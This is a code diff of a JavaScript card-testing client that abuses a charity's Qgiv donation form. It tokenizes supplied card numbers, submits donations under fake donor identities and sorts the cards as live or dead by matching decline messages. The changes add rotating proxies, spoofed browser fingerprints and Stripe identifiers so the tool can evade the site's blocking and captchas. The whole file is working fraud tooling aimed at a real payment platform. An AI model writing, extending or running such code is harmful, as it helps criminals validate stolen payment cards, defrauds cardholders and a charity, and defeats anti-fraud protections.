@@ -1,56 +1,14 @@
 import got from 'got';
 import { CookieJar } from 'tough-cookie';
 import { fakeDataService } from '../../utils/FakeDataService.js';
-import { HttpsProxyAgent } from 'https-proxy-agent';
-
-/**
- * SOAX Proxy Manager with Smart IP Reuse
- */
-class SOAXProxyManager {
-    constructor(config) {
-        this.host = config.host || 'proxy.soax.com';
-        this.port = config.port || 5000;
-        this.username = config.username;
-        this.password = config.password;
-        this.sessionLength = config.sessionLength || 600;
-        this.currentSession = null;
-    }
-
-    _generateSessionId() {
-        return `${Date.now().toString(36)}${Math.random().toString(36).substring(2, 10)}`;
-    }
-
-    getProxy() {
-        if (!this.currentSession) {
-            this._createNewSession();
-        }
-        return this.currentSession.agent;
-    }
-
-    forceRotate() {
-        this._createNewSession();
-        return this.currentSession.agent;
-    }
-
-    _createNewSession() {
-        const sessionId = this._generateSessionId();
-        const stickyUsername = `${this.username}-sessionid-${sessionId}-sessionlength-${this.sessionLength}`;
-        const proxyUrl = `http://${stickyUsername}:${this.password}@${this.host}:${this.port}`;
-
-        this.currentSession = {
-            agent: new HttpsProxyAgent(proxyUrl),
-            sessionId,
-            createdAt: Date.now()
-        };
-    }
-
-    isEnabled() {
-        return !!(this.username && this.password);
-    }
-}
+import { fingerprintGenerator } from '../../utils/FingerprintGenerator.js';
+import { proxyAgentFactory } from '../http/ProxyAgentFactory.js';
 
 /**
  * Qgiv Client
+ * Platform: Qgiv donation platform
+ * 
+ * Flow: Load Form → Tokenize Card → Submit Donation
  * 
  * Standard Status Codes:
  * - Approved = Card charged successfully
@@ -59,55 +17,117 @@ class SOAXProxyManager {
  * - Errors = Network/proxy errors
  */
 export class QgivClient {
-    constructor(siteConfig = {}, options = {}) {
-        this.site = {
-            id: 'qgiv-fidy',
-            label: 'Qgiv (Fidya)',
-            baseUrl: 'https://secure.qgiv.com',
-            formUrl: 'https://secure.qgiv.com/for/fidy/embed',
-            tokenizeUrl: 'https://secure.qgiv.com/api/v1/payment/tokenizePayment',
-            submitUrl: 'https://secure.qgiv.com/api/v1/submit',
-            formId: siteConfig.formId || '1104493',
-            ...siteConfig
-        };
+    constructor(siteConfig, options = {}) {
+        if (!siteConfig) {
+            throw new Error('QgivClient requires siteConfig');
+        }
+        
+        this.site = siteConfig;
+        this.proxyManager = options.proxyManager || null;
+        this.timeout = options.timeout || 30000;
+        this.maxRetries = options.maxRetries || 3;
+        this.debug = options.debug || false;
+    }
 
-        this.proxyConfig = options.proxyConfig || null;
-        this.soaxManager = this.proxyConfig ? new SOAXProxyManager(this.proxyConfig) : null;
-        this.maxRetries = options.maxRetries ?? 3;
-        this.timeout = options.timeout ?? 30000;
-        this.debug = options.debug ?? false;
+    // =========================================================================
+    // LOGGING
+    // =========================================================================
+    _log(step, message, data = null) {
+        if (!this.debug) return;
+        const ts = new Date().toISOString().slice(11, 23);
+        const prefix = `[${ts}] [${this.site.id}] ${step}:`;
+        if (data) {
+            console.log(`${prefix} ${message}`, JSON.stringify(data));
+        } else {
+            console.log(`${prefix} ${message}`);
+        }
+    }
+
+    // =========================================================================
+    // PROXY MANAGEMENT - Uses project's proxyAgentFactory with force rotation
+    // =========================================================================
+    
+    /**
+     * Get proxy agent from gateway proxyManager
+     * @param {boolean} forceNew - Force get new proxy (for rotation after block/captcha)
+     */
+    async getProxyAgent(forceNew = false) {
+        // If force rotation or no current agent, get new proxy
+        if (forceNew || !this._currentProxyAgent) {
+            if (this.proxyManager && typeof this.proxyManager.isEnabled === 'function' && this.proxyManager.isEnabled()) {
+                const proxy = await this.proxyManager.getNextProxy();
+                if (proxy) {
+                    this._log('PROXY', `${forceNew ? 'Rotated to' : 'Using'} ${proxy.host}:${proxy.port}`);
+                    this._currentProxyAgent = proxyAgentFactory.create(proxy);
+                    return this._currentProxyAgent;
+                }
+            }
+            this._currentProxyAgent = null;
+            return null;
+        }
+        
+        // Reuse existing proxy agent (same IP for same validation flow)
+        return this._currentProxyAgent;
+    }
+
+    /**
+     * Force rotation to new IP on next request
+     * Call this when blocked/captcha detected
+     */
+    forceRotateProxy() {
+        this._currentProxyAgent = null;
+        this._log('PROXY', 'Force rotation requested');
     }
 
     // =========================================================================
     // RESPONSE CLASSIFICATION
     // =========================================================================
-
-    /**
-     * CONFIRMED LIVE patterns - card definitely exists
-     * Only specific messages that confirm card validity
-     */
     static LIVE_PATTERNS = [
-        { pattern: 'address verification failed', code: 'avs_failed' },
         { pattern: 'insufficient funds', code: 'insufficient_funds' },
+        { pattern: 'insufficient_funds', code: 'insufficient_funds' },
         { pattern: 'insufficient balance', code: 'insufficient_funds' },
         { pattern: '3d secure', code: '3ds_required' },
         { pattern: 'authentication required', code: '3ds_required' },
+        { pattern: 'authentication_required', code: '3ds_required' },
+        { pattern: 'card_velocity_exceeded', code: 'velocity_exceeded' },
+        { pattern: 'incorrect_cvc', code: 'incorrect_cvc' },
+        { pattern: 'security code', code: 'incorrect_cvc' },
+    ];
+
+    static DEAD_PATTERNS = [
+        { pattern: 'address verification failed', code: 'avs_failed' },
+        { pattern: 'card_declined', code: 'card_declined' },
+        { pattern: 'generic_decline', code: 'generic_decline' },
+        { pattern: 'do_not_honor', code: 'do_not_honor' },
+        { pattern: 'lost_card', code: 'lost_card' },
+        { pattern: 'stolen_card', code: 'stolen_card' },
+        { pattern: 'expired_card', code: 'expired_card' },
+        { pattern: 'invalid_number', code: 'invalid_number' },
+        { pattern: 'invalid_expiry', code: 'invalid_expiry' },
+        { pattern: 'invalid_cvc', code: 'invalid_cvc' },
+        { pattern: 'fraudulent', code: 'fraudulent' },
+        { pattern: 'pickup_card', code: 'pickup_card' },
+        { pattern: 'restricted_card', code: 'restricted_card' },
     ];
 
     _classifyResponse(errorMsg) {
-        if (!errorMsg) return { status: 'Declined', code: 'unknown' };
+        if (!errorMsg) return { status: 'Declined', code: 'card_declined', originalMessage: null };
 
         const lower = errorMsg.toLowerCase();
 
-        // Check for CONFIRMED LIVE patterns (specific messages only)
         for (const item of QgivClient.LIVE_PATTERNS) {
             if (lower.includes(item.pattern)) {
-                return { status: 'Live', code: item.code };
+                return { status: 'Live', code: item.code, originalMessage: errorMsg };
             }
         }
 
-        // Everything else is Declined
-        return { status: 'Declined', code: 'generic_decline' };
+        for (const item of QgivClient.DEAD_PATTERNS) {
+            if (lower.includes(item.pattern)) {
+                return { status: 'Declined', code: item.code, originalMessage: errorMsg };
+            }
+        }
+
+        return { status: 'Declined', code: 'generic_decline', originalMessage: errorMsg };
     }
 
     _extractTransactionId(msg) {
@@ -115,32 +135,65 @@ export class QgivClient {
         return match ? match[1] : null;
     }
 
-    _log(step, message) {
-        // No-op: debug logging disabled
+    // =========================================================================
+    // BROWSER CONTEXT - Uses project's fingerprintGenerator
+    // =========================================================================
+    generateBrowserContext() {
+        const fingerprint = fingerprintGenerator.generateFingerprint({ mobile: false });
+        const chromeMatch = fingerprint.userAgent.match(/Chrome\/(\d+)/);
+        const chromeVersion = chromeMatch ? chromeMatch[1] : '131';
+
+        return {
+            guid: fingerprint.stripeIds.guid,
+            muid: fingerprint.stripeIds.muid,
+            sid: fingerprint.stripeIds.sid,
+            userAgent: fingerprint.userAgent,
+            sessionStart: Date.now(),
+            secChUa: `"Chromium";v="${chromeVersion}", "Google Chrome";v="${chromeVersion}", "Not-A.Brand";v="99"`,
+            secChUaPlatform: fingerprint.userAgent.includes('Windows') ? '"Windows"'
+                : fingerprint.userAgent.includes('Macintosh') ? '"macOS"' : '"Linux"',
+            secChUaMobile: fingerprint.userAgent.includes('Mobile') ? '?1' : '?0',
+            acceptLanguage: fingerprint.language.acceptLanguage,
+        };
     }
 
     generateFakeUser() {
-        return fakeDataService.generateFakeUser();
+        const user = fakeDataService.generateFakeUser();
+        const address = fakeDataService.generateAddress();
+        return {
+            ...user,
+            address: address.line1,
+            city: address.city,
+            state: address.state,
+            postalCode: address.postalCode,
+            country: address.country,
+        };
     }
 
     // =========================================================================
-    // SESSION
+    // SESSION - Uses got with cookie jar
     // =========================================================================
-    createSession(proxyAgent = null) {
+    createSession(proxyAgent = null, browserContext = null) {
         const cookieJar = new CookieJar();
 
         return got.extend({
             timeout: { request: this.timeout },
             headers: {
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'User-Agent': browserContext?.userAgent,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
-                'Accept-Language': 'en-US,en;q=0.9',
+                'Accept-Language': browserContext?.acceptLanguage,
                 'Accept-Encoding': 'gzip, deflate, br',
+                ...(browserContext && {
+                    'Sec-CH-UA': browserContext.secChUa,
+                    'Sec-CH-UA-Mobile': browserContext.secChUaMobile,
+                    'Sec-CH-UA-Platform': browserContext.secChUaPlatform,
+                }),
             },
             followRedirect: true,
             maxRedirects: 5,
             cookieJar,
             throwHttpErrors: false,
+            http2: false,
             ...(proxyAgent && { agent: { https: proxyAgent, http: proxyAgent } })
         });
     }
@@ -149,13 +202,16 @@ export class QgivClient {
     // API METHODS
     // =========================================================================
     async loadFormPage(session) {
+        const startTime = Date.now();
         try {
             const response = await session(this.site.formUrl, {
                 headers: { 'Referer': this.site.baseUrl }
             });
 
+            this._log('FORM', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });
+
             if (response.statusCode === 403) {
-                return { success: false, isBlocked: true };
+                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
             }
             if (response.statusCode !== 200) {
                 return { success: false, error: `HTTP_${response.statusCode}` };
@@ -164,13 +220,19 @@ export class QgivClient {
             const csrfMatch = response.body.match(/name=["']csrfToken["'][^>]*value=["']([^"']+)["']/i)
                 || response.body.match(/value=["']([^"']+)["'][^>]*name=["']csrfToken["']/i);
 
-            return { success: true, csrfToken: csrfMatch?.[1] || null };
+            if (!csrfMatch) {
+                return { success: false, error: 'NO_CSRF_TOKEN' };
+            }
+
+            return { success: true, csrfToken: csrfMatch[1] };
         } catch (error) {
-            return { success: false, error: error.code || error.message };
+            this._log('FORM', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
+            return { success: false, error: error.code || error.message, isNetworkError: true };
         }
     }
 
     async tokenizeCard(session, cardData, csrfToken) {
+        const startTime = Date.now();
         const url = `${this.site.tokenizeUrl}?csrfToken=${csrfToken}`;
         const expMonth = String(cardData.expMonth).padStart(2, '0');
         const expYear = String(cardData.expYear).length === 2 ? `20${cardData.expYear}` : String(cardData.expYear);
@@ -188,33 +250,40 @@ export class QgivClient {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Accept': 'application/json',
-                    'Origin': 'https://secure.qgiv.com',
+                    'Origin': this.site.baseUrl,
                     'Referer': this.site.formUrl,
                 }
             });
 
+            this._log('TOKEN', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });
+
             if (response.statusCode === 403) {
-                return { success: false, isBlocked: true };
+                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
             }
 
             let data;
-            try { data = JSON.parse(response.body); }
-            catch { return { success: false, error: 'INVALID_RESPONSE' }; }
+            try {
+                data = JSON.parse(response.body);
+            } catch {
+                return { success: false, error: 'INVALID_JSON', isNetworkError: true };
+            }
 
             if (data.success && data.token) {
                 return { success: true, token: data.token };
             }
 
-            return { success: false, error: data.message || 'Tokenization failed' };
+            return { success: false, error: data.message || 'TOKEN_FAILED' };
         } catch (error) {
-            return { success: false, error: error.code || error.message };
+            this._log('TOKEN', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
+            return { success: false, error: error.code || error.message, isNetworkError: true };
         }
     }
 
     async submitDonation(session, params) {
+        const startTime = Date.now();
         const { csrfToken, token, fakeUser, billingZip } = params;
         const url = `${this.site.submitUrl}?csrfToken=${csrfToken}`;
-        const zipCode = billingZip || fakeUser.postalCode || '10001';
+        const zipCode = billingZip || fakeUser.postalCode;
 
         const formData = new URLSearchParams({
             'form': this.site.formId,
@@ -233,7 +302,7 @@ export class QgivClient {
             'Personal[City]': '',
             'Personal[State]': '',
             'Personal[Zip]': zipCode,
-            'Personal[Country]': 'US',
+            'Personal[Country]': fakeUser.country,
             'Payment[Payment_Type]': '1',
             'Payment[Card_Token]': token,
             'Billing[Billing_Address]': '',
@@ -241,7 +310,7 @@ export class QgivClient {
             'Billing[Billing_City]': '',
             'Billing[Billing_State]': '',
             'Billing[Billing_Zip]': zipCode,
-            'Billing[Billing_Country]': 'US',
+            'Billing[Billing_Country]': fakeUser.country,
             'Billing[Billing_Address_Use_Mailing]': 'false',
             'Privacy[Anonymity]': 'false',
             'AbandonedGift[qgiv_abandoned_gift]': `abandonedGiftDetails_${this._generateHash()}`,
@@ -255,38 +324,39 @@ export class QgivClient {
                 headers: {
                     'Content-Type': 'application/x-www-form-urlencoded',
                     'Accept': 'application/json',
-                    'Origin': 'https://secure.qgiv.com',
+                    'Origin': this.site.baseUrl,
                     'Referer': this.site.formUrl,
                     'X-Requested-With': 'XMLHttpRequest',
                 }
             });
 
+            this._log('SUBMIT', `Response (${Date.now() - startTime}ms)`, { status: response.statusCode });
+
             if (response.statusCode === 403) {
-                return { success: false, isBlocked: true };
+                return { success: false, isBlocked: true, error: 'BLOCKED_403' };
             }
 
             let data;
-            try { data = JSON.parse(response.body); }
-            catch { return { success: false, error: 'INVALID_RESPONSE' }; }
+            try {
+                data = JSON.parse(response.body);
+            } catch {
+                return { success: false, error: 'INVALID_JSON', isNetworkError: true };
+            }
 
-            // Success - Approved
             const isSuccess = data.success === true || (data.success && data.success.transaction);
 
             if (isSuccess) {
                 const txId = data.donation_id || data.success?.transaction?.id;
-
                 if (data.requires_action) {
                     return { status: 'Live', code: '3ds_required', transactionId: txId };
                 }
                 return { status: 'Approved', transactionId: txId };
             }
 
-            // Error response - classify it
             if (data.errors && data.errors.length > 0) {
                 const errorMsg = data.errors[0];
                 const classification = this._classifyResponse(errorMsg);
                 const txId = this._extractTransactionId(errorMsg);
-
                 return {
                     status: classification.status,
                     code: classification.code,
@@ -295,9 +365,10 @@ export class QgivClient {
                 };
             }
 
-            return { status: 'Declined', code: 'unknown' };
+            return { status: 'Declined', code: 'card_declined', message: 'Card declined' };
         } catch (error) {
-            return { success: false, error: error.code || error.message };
+            this._log('SUBMIT', `Error (${Date.now() - startTime}ms)`, { code: error.code, msg: error.message });
+            return { success: false, error: error.code || error.message, isNetworkError: true };
         }
     }
 
@@ -305,44 +376,58 @@ export class QgivClient {
     // MAIN VALIDATION
     // =========================================================================
     async validate(cardData) {
-        const cardNum = cardData.number;
-        const cardPreview = `${cardNum.slice(0, 6)}****${cardNum.slice(-4)}`;
+        const cardPreview = `${cardData.number.slice(0, 6)}****${cardData.number.slice(-4)}`;
+        const startTime = Date.now();
 
         for (let attempt = 1; attempt <= this.maxRetries; attempt++) {
-            const proxyAgent = this.soaxManager?.isEnabled() ? this.soaxManager.getProxy() : null;
-            const session = this.createSession(proxyAgent);
+            // First attempt: get new proxy, subsequent: reuse unless blocked
+            const proxyAgent = await this.getProxyAgent(attempt === 1);
+            const browserContext = this.generateBrowserContext();
+            const session = this.createSession(proxyAgent, browserContext);
             const fakeUser = this.generateFakeUser();
+
+            this._log('VALIDATE', `Attempt ${attempt}/${this.maxRetries} | ${cardPreview}`);
 
             // Step 1: Load form
             const formResult = await this.loadFormPage(session);
             if (!formResult.success) {
-                if (formResult.isBlocked) {
-                    this._log('VALIDATE', `Blocked at form, rotating IP (${attempt}/${this.maxRetries})`);
-                    this.soaxManager?.forceRotate();
+                if (formResult.isBlocked && attempt < this.maxRetries) {
+                    this._log('VALIDATE', 'Blocked at form, rotating proxy...');
+                    this.forceRotateProxy();
                     continue;
                 }
-                if (attempt < this.maxRetries) continue;
-                return { status: 'Errors', message: formResult.error || 'Network error', card: cardPreview };
-            }
-
-            if (!formResult.csrfToken) {
-                return { status: 'Errors', message: 'NO_CSRF', card: cardPreview };
+                if (formResult.isNetworkError && attempt < this.maxRetries) {
+                    this.forceRotateProxy();
+                    continue;
+                }
+                return { 
+                    status: 'Errors', 
+                    message: formResult.error, 
+                    card: cardPreview,
+                    duration: Date.now() - startTime
+                };
             }
 
             // Step 2: Tokenize
             const tokenResult = await this.tokenizeCard(session, cardData, formResult.csrfToken);
             if (!tokenResult.success) {
-                if (tokenResult.isBlocked) {
-                    this._log('VALIDATE', `Blocked at tokenize, rotating IP (${attempt}/${this.maxRetries})`);
-                    this.soaxManager?.forceRotate();
+                if (tokenResult.isBlocked && attempt < this.maxRetries) {
+                    this._log('VALIDATE', 'Blocked at tokenize, rotating proxy...');
+                    this.forceRotateProxy();
                     continue;
                 }
+                if (tokenResult.isNetworkError && attempt < this.maxRetries) {
+                    this.forceRotateProxy();
+                    continue;
+                }
+                
                 const classification = this._classifyResponse(tokenResult.error);
                 return {
                     status: classification.status,
                     code: classification.code,
                     message: tokenResult.error,
-                    card: cardPreview
+                    card: cardPreview,
+                    duration: Date.now() - startTime
                 };
             }
 
@@ -355,69 +440,42 @@ export class QgivClient {
             });
 
             if (submitResult.success === false) {
-                if (submitResult.isBlocked) {
-                    this._log('VALIDATE', `Blocked at submit, rotating IP (${attempt}/${this.maxRetries})`);
-                    this.soaxManager?.forceRotate();
+                if (submitResult.isBlocked && attempt < this.maxRetries) {
+                    this._log('VALIDATE', 'Blocked at submit, rotating proxy...');
+                    this.forceRotateProxy();
                     continue;
                 }
-                if (attempt < this.maxRetries) continue;
-                return { status: 'Errors', message: submitResult.error || 'Network error', card: cardPreview };
+                if (submitResult.isNetworkError && attempt < this.maxRetries) {
+                    this.forceRotateProxy();
+                    continue;
+                }
+                return { 
+                    status: 'Errors', 
+                    message: submitResult.error, 
+                    card: cardPreview,
+                    duration: Date.now() - startTime
+                };
             }
 
-            // Got a result!
+            this._log('VALIDATE', `Result: ${submitResult.status}`, { code: submitResult.code });
+
             return {
                 status: submitResult.status,
                 code: submitResult.code,
                 message: submitResult.message,
                 transactionId: submitResult.transactionId,
                 card: cardPreview,
-                attempts: attempt
+                attempts: attempt,
+                duration: Date.now() - startTime
             };
         }
 
-        // All retries exhausted due to blocks
-        return { status: 'Errors', message: 'Proxy blocked - change proxy', card: cardPreview };
-    }
-
-    // =========================================================================
-    // MASS VALIDATION
-    // =========================================================================
-    async validateMany(cards, options = {}) {
-        const concurrency = options.concurrency ?? 3;
-        const onResult = options.onResult;
-        const results = new Array(cards.length);
-
-        let running = 0;
-        let nextIdx = 0;
-
-        return new Promise((resolve) => {
-            const processNext = async () => {
-                if (nextIdx >= cards.length) {
-                    if (running === 0) resolve(results);
-                    return;
-                }
-
-                const idx = nextIdx++;
-                const card = cards[idx];
-                running++;
-
-                const start = Date.now();
-                const result = await this.validate(card);
-                result.duration = Date.now() - start;
-                result.index = idx;
-
-                results[idx] = result;
-                onResult?.(result, idx, cards.length);
-
-                running--;
-                processNext();
-            };
-
-            for (let i = 0; i < Math.min(concurrency, cards.length); i++) {
-                processNext();
-            }
-            if (cards.length === 0) resolve([]);
-        });
+        return { 
+            status: 'Errors', 
+            message: 'MAX_RETRIES_EXCEEDED', 
+            card: cardPreview,
+            duration: Date.now() - startTime
+        };
     }
 
     _generateHash() {
